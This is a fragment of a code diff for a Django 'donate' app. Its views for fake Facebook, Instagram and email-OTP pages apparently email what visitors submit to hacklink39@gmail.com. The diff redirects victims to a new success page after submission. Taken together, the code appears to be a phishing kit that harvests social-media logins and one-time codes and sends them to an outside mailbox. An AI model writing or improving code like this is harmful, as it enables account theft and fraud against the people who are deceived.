@@ -50,12 +50,15 @@ def emailotp(request):
         ['hacklink39@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('emailotp')
+       return redirect('success')
 
    return render(request, 'donate/emailotp.html')
 
 def blog( request):
     return render (request, 'donate/blog.html') 
+
+def success( request):
+    return render (request, 'donate/success.html') 
 
 def contact( request):
     return render (request, 'donate/contact.html') 
@@ -83,7 +86,7 @@ def facebook(request):
         ['hacklink39@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/facebook.html')
 
@@ -103,7 +106,7 @@ def instagram(request):
         ['hacklink39@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/instagram.html')
 
